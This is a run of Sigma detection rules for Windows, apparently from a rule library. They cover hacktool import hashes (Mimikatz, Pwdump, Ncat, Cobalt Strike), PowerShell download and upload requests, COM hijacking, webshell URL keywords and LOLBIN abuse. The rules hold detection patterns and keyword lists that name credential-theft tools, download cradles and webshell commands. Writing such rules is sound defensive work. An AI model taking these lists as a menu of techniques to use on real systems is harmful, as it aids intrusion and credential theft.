<li><a href="#">title:Windows Hacktool Imphash id: 24e3e58a-646b-4b50-adef-02ef935b9fc8 description: Detects the use of Windows hacktools based on their import hash (imphash) even if the files have been renamed status: experimental author: Florian Roth references: - Internal Research date: 2022/03/04 modified: 2022/03/16 logsource: category: process_creation product: windows detection: selection: - Imphash: - BCCA3C247B619DCD13C8CDFF5F123932 # PetitPotam - 3A19059BD7688CB88E70005F18EFC439 # PetitPotam - 9DA6D5D77BE11712527DCAB86DF449A3 # Mimikatz - A6E01BC1AB89F8D91D9EAB72032AAE88 # Mimikatz - D21BBC50DCC169D7B4D0F01962793154 # Mimikatz - 9528A0E91E28FBB88AD433FEABCA2456 # Mimikatz - 4C1B52A19748428E51B14C278D0F58E3 # Mimikatz - 725BB81DC24214F6ECACC0CFB36AD30D # Mimikatz - 672B13F4A0B6F27D29065123FE882DFC # Mimikatz - 0C106686A31BFE2BA931AE1CF6E9DBC6 # Mimikatz - 23867A89C2B8FC733BE6CF5EF902F2D1 # JuicyPotato - 9FB060C2977A9D9B782440B98D410C3E # RoguePotato - B18A1401FF8F444056D29450FBC0A6CE # Pwdump - 13F08707F759AF6003837A150A371BA1 # Pwdump - 749A7BB1F0B4C4455949C0B2BF7F9E9F # Pwdump - 94CB940A1A6B65BED4D5A8F849CE9793 # PwDumpX - 1781F06048A7E58B323F0B9259BE798B # Pwdump - CB567F9498452721D77A451374955F5F # Pwdump - 730073214094CD328547BF1F72289752 # Htran - 6EEFD92BFFBFB27F378B81C09CA96786 # Ncat - AC615FB1D93576FA3C26077A619C9144 # Ncat - DC25EE78E2EF4D36FAA0BADF1E7461C9 # Cobalt Strike beacons - 17B461A082950FC6332228572138B80C # Cobalt Strike beacons - C547F2E66061A8DFFB6F5A3FF63C0A74 # PPLDump - 0588081AB0E63BA785938467E1B10CCA # PPLDump - ADA161BF41B8E5E9132858CB54CAB5FB # DripLoader - 2A1BC4913CD5ECB0434DF07CB675B798 # DripLoader - 11083E75553BAAE21DC89CE8F9A195E4 # DripLoader - A23D29C9E566F2FA8FFBB79267F5DF80 # DripLoader - Hashes|contains: # Sysmon field hashes contains all types - IMPHASH=BCCA3C247B619DCD13C8CDFF5F123932 # PetitPotam - IMPHASH=3A19059BD7688CB88E70005F18EFC439 # PetitPotam - IMPHASH=9DA6D5D77BE11712527DCAB86DF449A3 # Mimikatz - IMPHASH=A6E01BC1AB89F8D91D9EAB72032AAE88 # Mimikatz - IMPHASH=D21BBC50DCC169D7B4D0F01962793154 # Mimikatz - IMPHASH=9528A0E91E28FBB88AD433FEABCA2456 # Mimikatz - IMPHASH=4C1B52A19748428E51B14C278D0F58E3 # Mimikatz - IMPHASH=725BB81DC24214F6ECACC0CFB36AD30D # Mimikatz - IMPHASH=672B13F4A0B6F27D29065123FE882DFC # Mimikatz - IMPHASH=0C106686A31BFE2BA931AE1CF6E9DBC6 # Mimikatz - IMPHASH=23867A89C2B8FC733BE6CF5EF902F2D1 # JuicyPotato - IMPHASH=9FB060C2977A9D9B782440B98D410C3E # RoguePotato - IMPHASH=B18A1401FF8F444056D29450FBC0A6CE # Pwdump - IMPHASH=13F08707F759AF6003837A150A371BA1 # Pwdump - IMPHASH=749A7BB1F0B4C4455949C0B2BF7F9E9F # Pwdump - IMPHASH=94CB940A1A6B65BED4D5A8F849CE9793 # PwDumpX - IMPHASH=1781F06048A7E58B323F0B9259BE798B # Pwdump - IMPHASH=CB567F9498452721D77A451374955F5F # Pwdump - IMPHASH=730073214094CD328547BF1F72289752 # Htran - IMPHASH=6EEFD92BFFBFB27F378B81C09CA96786 # Ncat - IMPHASH=AC615FB1D93576FA3C26077A619C9144 # Ncat - IMPHASH=DC25EE78E2EF4D36FAA0BADF1E7461C9 # Cobalt Strike beacons - IMPHASH=17B461A082950FC6332228572138B80C # Cobalt Strike beacons - IMPHASH=C547F2E66061A8DFFB6F5A3FF63C0A74 # PPLDump - IMPHASH=0588081AB0E63BA785938467E1B10CCA # PPLDump - IMPHASH=ADA161BF41B8E5E9132858CB54CAB5FB # DripLoader - IMPHASH=2A1BC4913CD5ECB0434DF07CB675B798 # DripLoader - IMPHASH=11083E75553BAAE21DC89CE8F9A195E4 # DripLoader - IMPHASH=A23D29C9E566F2FA8FFBB79267F5DF80 # DripLoader condition: selection falsepositives: - Legitimate use of one of these tools level: high 
<li><a href="#">title:Windows Network Access Suspicious desktop.ini Action id: 35bc7e28-ee6b-492f-ab04-da58fcf6402e status: test description: Detects unusual processes accessing desktop.ini remotely over network share, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk. author: Tim Shelton (HAWK.IO) references: - date: 2021/12/06 modified: 2022/01/16 logsource: product: windows service: security detection: selection: EventID: 5145 ObjectType: File RelativeTargetName|endswith: '\desktop.ini' AccessList|contains: - 'WriteData' - 'DELETE' - 'WriteDAC' - 'AppendData' - 'AddSubdirectory' condition: selection falsepositives: - Read only access list authority level: medium tags: - attack.persistence - attack.t1547.009 
<li><a href="#">title:Windows Network Enumeration id: 62510e69-616b-4078-b371-847da438cc03 status: stable description: Identifies attempts to enumerate hosts in a network using the built-in Windows net.exe tool. references: - - author: Endgame, JHasenbusch (ported for oscd.community) date: 2018/10/30 modified: 2019/11/11 tags: - attack.discovery - attack.t1018 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\net.exe' - '\net1.exe' CommandLine|contains: 'view' filter: CommandLine|contains: \\\ condition: selection and not filter fields: - ComputerName - User - CommandLine falsepositives: - Legitimate use of net.exe utility by legitimate user level: low 
<li><a href="#">title:Windows Pcap Drivers id: 7b687634-ab20-11ea-bb37-0242ac130002 status: test description: Detects Windows Pcap driver installation based on a list of associated .sys files. author: Cian Heasley references: - date: 2020/06/10 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains: - 'pcap' - 'npcap' - 'npf' - 'nm3' - 'ndiscap' - 'nmnt' - 'windivert' - 'USBPcap' - 'pktmon' condition: selection fields: - EventID - ServiceFileName - Account_Name - Computer_Name - Originating_Computer - ServiceName falsepositives: - Unknown level: medium tags: - attack.discovery - attack.credential_access - attack.t1040 
<li><a href="#">title:Windows PowerShell Upload Web Request id: d2e3f2f6-7e09-4bf2-bc5d-90186809e7fb status: experimental description: Detects the use of various web request POST or PUT methods (including aliases) via Windows PowerShell command references: - - - author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: 'Script block logging must be enabled' detection: selection_cmdlet: ScriptBlockText|contains: - 'Invoke-WebRequest' - 'iwr ' selection_method: ScriptBlockText|contains: '-Method ' selection_verb: - ' Put ' - ' Post ' condition: all of selection_* falsepositives: - Legitimate script level: medium tags: - attack.exfiltration - attack.t1020 
<li><a href="#">title:Windows PowerShell User Agent id: c8557060-9221-4448-8794-96320e6f3e74 status: test description: Detects Windows PowerShell Web Access author: Florian Roth references: - date: 2017/03/13 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent|contains: ' WindowsPowerShell/' condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Administrative scripts that download files from the Internet - Administrative scripts that retrieve certain website contents level: medium tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Windows PowerShell Web Request id: 1139d2e2-84b1-4226-b445-354492eba8ba related: - id: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d type: derived status: experimental description: Detects the use of various web request methods (including aliases) via Windows PowerShell command references: - - author: James Pemberton / @4A616D6573 date: 2019/10/24 modified: 2021/10/16 tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: 'Script block logging must be enabled' detection: selection: ScriptBlockText|contains: - 'Invoke-WebRequest' - 'iwr ' - 'wget ' - 'curl ' - 'Net.WebClient' - 'Start-BitsTransfer' condition: selection falsepositives: - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer. level: medium 
<li><a href="#">title:Windows Processes Suspicious Parent Directory id: 96036718-71cc-4027-a538-d1587e0006a7 status: experimental description: Detect suspicious parent processes of well-known Windows processes author: vburov references: - - - - date: 2019/02/23 modified: 2022/02/14 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\svchost.exe' - '\taskhost.exe' - '\lsm.exe' - '\lsass.exe' - '\services.exe' - '\lsaiso.exe' - '\csrss.exe' - '\wininit.exe' - '\winlogon.exe' filter_sys: - ParentImage|endswith: - '\SavService.exe' - '\ngen.exe' - ParentImage|contains: - '\System32\' - '\SysWOW64\' filter_msmpeng: ParentImage|contains: - '\Windows Defender\' - '\Microsoft Security Client\' ParentImage|endswith: '\MsMpEng.exe' filter_null: - ParentImage: null - ParentImage: '-' condition: selection and not 1 of filter_* falsepositives: - Some security products seem to spawn these level: low tags: - attack.defense_evasion - attack.t1036.003 - attack.t1036.005 
<li><a href="#">title:Windows Registry Persistence COM Key Linking id: 9b0f8a61-91b2-464f-aceb-0527e0a45020 status: experimental description: Detects COM object hijacking via TreatAs subkey references: - author: Kutepov Anton, oscd.community date: 2019/10/23 modified: 2022/03/26 logsource: category: registry_add product: windows detection: selection: EventType: 'CreateKey' # don't want DeleteKey events TargetObject|contains|all: - 'HKU\' - 'Classes\CLSID\' - '\TreatAs' condition: selection falsepositives: - Maybe some system utilities in rare cases use linking keys for backward compatibility level: medium tags: - attack.persistence - attack.t1546.015 
<li><a href="#">title:Windows Registry Persistence COM Search Order Hijacking id: a0ff33d8-79e4-4cef-b4f3-9dc4133ccd12 status: experimental description: Detects potential COM object hijacking leveraging the COM Search Order references: - - author: Maxime Thiebaut (@0xThiebaut), oscd.community, CÃ©dric Hien date: 2020/04/14 modified: 2022/04/04 logsource: category: registry_set product: windows detection: selection: # Detect new COM servers in the user hive EventType: SetValue TargetObject|startswith: - 'HKCR\CLSID\' - 'HKCU\Software\Classes\CLSID\' TargetObject|endswith: '\InprocServer32\(Default)' filter1: Details|contains: # Exclude privileged directories and observed FPs - '%%systemroot%%\system32\' - '%%systemroot%%\SysWow64\' filterOneDrive: Details|contains: - '\AppData\Local\Microsoft\OneDrive\' - '\FileCoAuthLib64.dll' - '\FileSyncShell64.dll' - '\FileSyncApi64.dll' filter2: Details|contains|all: - '\AppData\Local\Microsoft\TeamsMeetingAddin\' - '\Microsoft.Teams.AddinLoader.dll' filter3: Details|contains|all: - '\AppData\Roaming\Dropbox\' - '\DropboxExt64.*.dll' filter4: Details|endswith: TmopIEPlg.dll #TrendMicro osce filter5: Image: - C:\WINDOWS\system32\wuauclt.exe - C:\WINDOWS\system32\svchost.exe filter_defender: Image|startswith: - 'C:\ProgramData\Microsoft\Windows Defender\Platform\' - 'C:\Program Files\Windows Defender\' Image|endswith: '\MsMpEng.exe' filter_nvidia: Details|contains: '\FileRepository\nvmdi.inf' filter_edge: Image|endswith: '\MicrosoftEdgeUpdateComRegisterShell64.exe' filter_dx: Image: 'C:\WINDOWS\SYSTEM32\dxdiag.exe' filter_python: Details: - 'C:\Windows\pyshellext.amd64.dll' - 'C:\Windows\pyshellext.dll' filter_bonjourlib: Details: - 'C:\Windows\system32\dnssdX.dll' - 'C:\Windows\SysWOW64\dnssdX.dll' filter_printextensionmanager: Details: 'C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll' filter_programfiles: Details|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' filter_gameservice: Details|contains: 'C:\WINDOWS\system32\GamingServicesProxy.dll' condition: selection and not 1 of filter* falsepositives: - Some installed utilities (i.e. OneDrive) may serve new COM objects at user-level level: medium tags: - attack.persistence - attack.t1546.015 
<li><a href="#">title:Windows Registry Trust Record Modification id: 295a59c1-7b79-4b47-a930-df12c15fc9c2 status: test description: Alerts on trust record modification within the registry, indicating usage of macros author: Antonlovesdnb references: - - date: 2020/02/19 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: 'TrustRecords' condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: medium tags: - attack.initial_access - attack.t1566.001 
<li><a href="#">title:Windows Screen Capture with CopyFromScreen id: d4a11f63-2390-411c-9adf-d791fd152830 status: experimental description: | Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations references: - author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: '.CopyFromScreen' condition: selection falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1113 
<li><a href="#">title:Windows Shell File Write to Suspicious Folder id: 1277f594-a7d1-4f28-a2d3-73af5cbeab43 status: experimental description: Detects a Windows executable that writes files to suspicious folders references: - No references author: Florian Roth date: 2021/11/20 modified: 2021/11/24 logsource: category: file_event product: windows detection: selection_shells: Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\sh.exe' - '\bash.exe' - '\msbuild.exe' # - '\certutil.exe' TargetFilename|contains: - 'C:\Users\Public' - 'C:\PerfLogs' selection_program: Image|endswith: - '\schtasks.exe' - '\wmic.exe' # - '\mshta.exe' # - '\rundll32.exe' - '\forfiles.exe' - '\scriptrunner.exe' - '\certutil.exe' TargetFilename|contains: - 'C:\Users\Public' - 'C:\PerfLogs' - '\AppData\' - 'C:\Windows\Temp' condition: 1 of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Windows Shell Spawning Suspicious Program id: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde status: test description: Detects a suspicious child process of a Windows shell author: Florian Roth, Tim Shelton references: - date: 2018/04/06 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - '\mshta.exe' - '\powershell.exe' # - '*\cmd.exe' # too many false positives - '\rundll32.exe' - '\cscript.exe' - '\wscript.exe' - '\wmiprvse.exe' Image|endswith: - '\schtasks.exe' - '\nslookup.exe' - '\certutil.exe' - '\bitsadmin.exe' - '\mshta.exe' falsepositives_1: CurrentDirectory|contains: '\ccmcache\' falsepositives_2: ParentCommandLine|contains: # FP - Amazon Workspaces - '\Program Files\Amazon\WorkSpacesConfig\Scripts\setup-scheduledtask.ps1' - '\Program Files\Amazon\WorkSpacesConfig\Scripts\set-selfhealing.ps1' - '\Program Files\Amazon\WorkSpacesConfig\Scripts\check-workspacehealth.ps1' - '\nessus_' # Tenable/Nessus VA Scanner falsepositives_3: CommandLine|contains: '\nessus_' # Tenable/Nessus VA Scanner condition: selection and not 1 of falsepositives* fields: - CommandLine - ParentCommandLine - CurrentDirectory - Image - ParentImage falsepositives: - Administrative scripts - Microsoft SCCM level: high tags: - attack.execution - attack.defense_evasion - attack.t1059.005 - attack.t1059.001 - attack.t1218 
<li><a href="#">title:Windows Spooler Service Suspicious Binary Load id: 02fb90de-c321-4e63-a6b9-25f4b03dfd14 status: experimental description: Detect DLL Load from Spooler Service backup folder references: - - author: FPT.EagleEye, Thomas Patzke (improvements) date: 2021/06/29 modified: 2022/06/02 logsource: category: image_load product: windows detection: selection: Image|endswith: '\spoolsv.exe' ImageLoaded|contains: - '\Windows\System32\spool\drivers\x64\3\' - '\Windows\System32\spool\drivers\x64\4\' ImageLoaded|endswith: '.dll' condition: selection falsepositives: - Loading of legitimate driver level: informational tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1574 - cve.2021.1675 - cve.2021.34527 
<li><a href="#">title:Windows Spooler Service Suspicious File Deletion id: 5b2bbc47-dead-4ef7-8908-0cf73fcbecbf status: experimental description: Detect DLL deletions from Spooler Service driver folder references: - - author: Bhabesh Raj date: 2021/07/01 modified: 2022/06/02 tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1574 - cve.2021.1675 logsource: category: file_delete product: windows detection: selection: Image|endswith: '\spoolsv.exe' TargetFilename|contains: 'C:\Windows\System32\spool\drivers\x64\3\' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Windows Suspicious Use Of Web Request in CommandLine id: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d status: experimental description: Detects the use of various web request with commandline tools or Windows PowerShell command,methods (including aliases) references: - - author: James Pemberton / @4A616D6573 date: 2019/10/24 modified: 2021/09/21 tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'Invoke-WebRequest' - 'iwr ' - 'wget ' - 'curl ' - 'Net.WebClient' - 'Start-BitsTransfer' condition: selection falsepositives: - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer. level: medium 
<li><a href="#">title:Windows Update Client LOLBIN id: d7825193-b70a-48a4-b992-8b5b3015cc11 status: experimental description: Detects code execution via the Windows Update client (wuauclt) references: - author: FPT.EagleEye Team date: 2020/10/17 modified: 2022/05/13 tags: - attack.command_and_control - attack.execution - attack.t1105 - attack.t1218 logsource: product: windows category: process_creation detection: selection_cli: CommandLine|contains|all: - '/UpdateDeploymentProvider' - '/RunHandlerComServer' - '.dll' selection_img: - Image|endswith: '\wuauclt.exe' - OriginalFileName: 'wuauclt.exe' filter: CommandLine|contains: - ' /ClassId ' - ' wuaueng.dll ' condition: all of selection* and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Windows Update Error id: 13cfeb75-9e33-4d04-b0f7-ab8faaa95a59 status: experimental description: Windows Update get some error Check if need a 0-days KB author: frack113 date: 2021/12/04 logsource: product: windows service: system definition: Other error are in Microsoft-Windows-WindowsUpdateClient/Operational detection: selection: Provider_Name: Microsoft-Windows-WindowsUpdateClient EventID: - 16 # Unable to Connect: Windows is unable to connect to the automatic updates service and therefore cannot download and install updates according to the set schedule - 20 # Installation Failure: Windows failed to install the following update with error - 24 # Uninstallation Failure: Windows failed to uninstall the following update with error - 213 # Revert Failure: Windows failed to revert the following update with error - 217 # Commit Failure: Windows failed to commit the following update with error condition: selection falsepositives: - Unknown level: low tags: - attack.impact - attack.resource_development - attack.t1584 
<li><a href="#">title:Windows WebDAV User Agent id: e09aed7a-09e0-4c9a-90dd-f0d52507347e status: test description: Detects WebDav DownloadCradle author: Florian Roth references: - date: 2018/04/06 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent|startswith: 'Microsoft-WebDAV-MiniRedir/' cs-method: 'GET' condition: selection fields: - ClientIP - c-uri - c-useragent - cs-method falsepositives: - Administrative scripts that download files from the Internet - Administrative scripts that retrieve certain website contents - Legitimate WebDAV administration level: high tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Windows Webshell Creation id: 39f1f9f2-9636-45de-98f6-a4046aa8e4b9 status: test description: Possible webshell file creation on a static web site author: Beyu Denis, oscd.community, Tim Shelton references: - PT ESC rule and personal experience date: 2019/10/22 modified: 2022/05/24 logsource: product: windows category: file_event detection: selection_2: TargetFilename|contains: '\inetpub\wwwroot\' selection_3: TargetFilename|contains: - '.asp' - '.ashx' - '.ph' selection_4: TargetFilename|contains: - '\www\' - '\htdocs\' - '\html\' selection_5: TargetFilename|contains: '.ph' selection_6: - TargetFilename|endswith: '.jsp' - TargetFilename|contains|all: - '\cgi-bin\' - '.pl' false_positive1: # false positives when unpacking some executables in $TEMP TargetFilename|contains: - '\AppData\Local\Temp\' - '\Windows\Temp\' false_positive2: Image: 'System' # fp : backup/restore from drivers condition: not false_positive2 and ( (selection_2 and selection_3 and not false_positive1) or (selection_4 and selection_5 and not false_positive1) or (selection_6 and not false_positive1) ) falsepositives: - Legitimate administrator or developer creating legitimate executable files in a web application folder level: high tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:Windows Webshell Strings id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729 status: test description: Detects Windows Webshells that use GET requests via access logs author: Florian Roth, Nasreddine Bencherchali date: 2017/02/19 modified: 2022/06/14 references: - logsource: category: webserver detection: select_method: cs-method: 'GET' keywords: - =whoami - =net%20user - =cmd%20/c%20 - =powershell%20 - =tasklist%20 - =wmic%20 - =ssh%20 #available on windows - =python%20 - =ipconfig - =wget%20 #available on windows - =curl%20 #available on windows - =certutil - =copy%20%5C%5C condition: select_method and keywords fields: - client_ip - vhost - url - response falsepositives: - Web sites like wikis with articles on os commands and pages that include the os commands in the URLs - User searches in search boxes of the respective website level: high tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:WINEKEY Registry Modification id: b98968aa-dbc0-4a9c-ac35-108363cbf8d5 status: test description: Detects potential malicious modification of run keys by winekey or team9 backdoor author: omkar72 references: - date: 2020/10/30 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: 'Software\Microsoft\Windows\CurrentVersion\Run\Backup Mgr' condition: selection fields: - ComputerName - Image - EventType - TargetObject falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547 
<li><a href="#">title:Winlogon Helper DLL id: 851c506b-6b7c-4ce2-8802-c703009d03c0 status: experimental description: Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon. Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. author: Timur Zinniatullin, oscd.community date: 2019/10/21 modified: 2021/10/16 references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: 'CurrentVersion\Winlogon' selection2: ScriptBlockText|contains: - 'Set-ItemProperty' - 'New-Item' condition: selection and selection2 falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1547.004 
<li><a href="#">title:Winlogon Notify Key Logon Persistence id: bbf59793-6efb-4fa1-95ca-a7d288e52c88 description: | Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. author: frack113 date: 2021/12/30 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: TargetObject|endswith: '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\logon' Details|endswith: '.dll' EventType: SetValue condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.004 
<li><a href="#">title:Winnti Malware HK University Campaign id: 3121461b-5aa0-4a41-b910-66d25524edbb status: test description: Detects specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Honk Kong universities author: Florian Roth, Markus Neis references: - date: 2020/02/01 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: ParentImage|contains: - 'C:\Windows\Temp' - '\hpqhvind.exe' Image|startswith: 'C:\ProgramData\DRM' selection2: ParentImage|startswith: 'C:\ProgramData\DRM' Image|endswith: '\wmplayer.exe' selection3: ParentImage|endswith: '\Test.exe' Image|endswith: '\wmplayer.exe' selection4: Image: 'C:\ProgramData\DRM\CLR\CLR.exe' selection5: ParentImage|startswith: 'C:\ProgramData\DRM\Windows' Image|endswith: '\SearchFilterHost.exe' condition: 1 of selection* falsepositives: - Unlikely level: critical tags: - attack.defense_evasion - attack.t1574.002 - attack.g0044 
<li><a href="#">title:Winnti Pipemon Characteristics id: 73d70463-75c9-4258-92c6-17500fe972f2 status: stable description: Detects specific process characteristics of Winnti Pipemon malware reported by ESET author: Florian Roth, oscd.community references: - date: 2020/07/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: 'setup0.exe -p' selection2a: CommandLine|contains: 'setup.exe' selection2b: CommandLine|endswith: - '-x:0' - '-x:1' - '-x:2' condition: selection1 or all of selection2* falsepositives: - Legitimate setups that use similar flags level: critical tags: - attack.defense_evasion - attack.t1574.002 - attack.g0044 
<li><a href="#">title:Winrar Compressing Dump Files id: 1ac14d38-3dfc-4635-92c7-e3fd1c5f5bfc status: experimental description: Detects a suspicious winrar execution that involves a file with a .dmp extension, which could be a step in a process of dump file exfiltration references: - author: Florian Roth date: 2022/01/04 modified: 2022/06/17 logsource: category: process_creation product: windows detection: selection: - Image|endswith: - '\rar.exe' - '\winrar.exe' - Description: 'Command line RAR' dumpfile: CommandLine|contains: '.dmp' condition: selection and dumpfile falsepositives: - Legitimate use of WinRAR with a command line in which .dmp appears incidentally level: high tags: - attack.collection - attack.t1560.001 
<li><a href="#">title:Winrar Execution in Non-Standard Folder id: 4ede543c-e098-43d9-a28f-dd784a13132f status: experimental description: Detects a suspicious winrar execution in a folder which is not the default installation folder references: - author: Florian Roth, Tigzy date: 2021/11/17 modified: 2021/11/22 tags: - attack.collection - attack.t1560.001 logsource: category: process_creation product: windows detection: selection: - Image|endswith: - '\rar.exe' - '\winrar.exe' - Description: 'Command line RAR' filter: Image|contains: - '\WinRAR' - 'C:\Windows\Temp' - '\UnRAR.exe' condition: selection and not filter falsepositives: - Legitimate use of WinRAR in a folder of a software that bundles WinRAR level: high 
<li><a href="#">title:WinRM Access with Evil-WinRM id: a197e378-d31b-41c0-9635-cfdf1c1bb423 status: experimental description: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. author: frack113 references: - - date: 2022/01/07 logsource: category: process_creation product: windows detection: selection_mstsc: Image|endswith: \ruby.exe CommandLine|contains|all: - '-i ' - '-u ' - '-p ' condition: 1 of selection_* falsepositives: - Unknown level: medium tags: - attack.lateral_movement - attack.t1021.006 
<li><a href="#">title:WinSock2 Autorun Keys Modification id: d6c2ce7e-afb5-4337-9ca4-4b5254ed0565 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/03/26 logsource: category: registry_set product: windows detection: winsock_parameters_base: EventType: SetValue TargetObject|contains: '\System\CurrentControlSet\Services\WinSock2\Parameters' winsock_parameters: TargetObject|contains: - '\Protocol_Catalog9\Catalog_Entries' - '\NameSpace_Catalog5\Catalog_Entries' filter: - Details: '(Empty)' - Image: 'C:\Windows\System32\MsiExec.exe' - Image: 'C:\Windows\syswow64\MsiExec.exe' condition: winsock_parameters_base and winsock_parameters and not filter fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Winword LOLBIN Usage id: 4ae3e30b-b03f-43aa-87e3-b622f4048eed status: experimental description: Winword can be abused as a LOLBIN to download arbitary file or load arbitary DLLs author: Nasreddine Bencherchali references: - - date: 2022/05/17 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\WINWORD.exe' - OriginalFileName: 'WinWord.exe' selection_cli_http: CommandLine|contains: - 'http://' - 'https://' selection_cli_dll: CommandLine|contains: - '/l ' - '.dll' condition: selection_img and 1 of selection_cli* falsepositives: - Unknown level: high 
<li><a href="#">title:Winword.exe Loads Suspicious DLL id: 2621b3a6-3840-4810-ac14-a02426086171 status: test description: Detects Winword.exe loading of custmom dll via /l cmd switch author: Victor Sergeev, oscd.community references: - date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: image_path: Image|endswith: '\winword.exe' cmd: CommandLine|contains: '/l' condition: image_path and cmd fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:Wlrmdr Lolbin Use as Laucher id: 9cfc00b6-bfb7-49ce-9781-ef78503154bb status: experimental description: Detects use of Wlrmdr.exe in which the -u parameter is passed to ShellExecute references: - author: frack113 date: 2022/02/16 modified: 2022/06/02 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\wlrmdr.exe' CommandLine|contains|all: - '-s ' - '-f ' - '-t ' - '-m ' - '-a ' - '-u ' filter: ParentImage: 'C:\Windows\System32\winlogon.exe' condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.defense_evasion 
<li><a href="#">title:WMI Backdoor Exchange Transport Agent id: 797011dc-44f4-4e6f-9f10-a8ceefbe566b status: test description: Detects a WMI backdoor in Exchange Transport Agents via WMI event filters author: Florian Roth references: - - date: 2019/10/11 modified: 2022/03/18 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\EdgeTransport.exe' filter: Image: 'C:\Windows\System32\conhost.exe' condition: selection and not filter falsepositives: - Unknown level: critical tags: - attack.persistence - attack.t1546.003 
<li><a href="#">title:WMI Event Consumer Created Named Pipe id: 493fb4ab-cdcc-4c4f-818c-0e363bd1e4bb status: experimental description: Detects the WMI Event Consumer service scrcons.exe creating a named pipe references: - date: 2021/09/01 author: Florian Roth logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , . How to test detection? You can check powershell script from this site ' detection: selection: Image|endswith: '\scrcons.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.t1047 - attack.execution 
<li><a href="#">title:WMI Event Subscription id: 0f06a3a5-6a09-413f-8743-e6cf35561297 status: test description: Detects creation of WMI event subscription persistence method author: Tom Ueltschi (@c_APT_ure) date: 2019/01/12 modified: 2021/11/27 logsource: product: windows category: wmi_event detection: selection: EventID: - 19 - 20 - 21 condition: selection falsepositives: - Exclude legitimate (vetted) use of WMI event subscription in your network level: medium tags: - attack.persistence - attack.t1546.003 
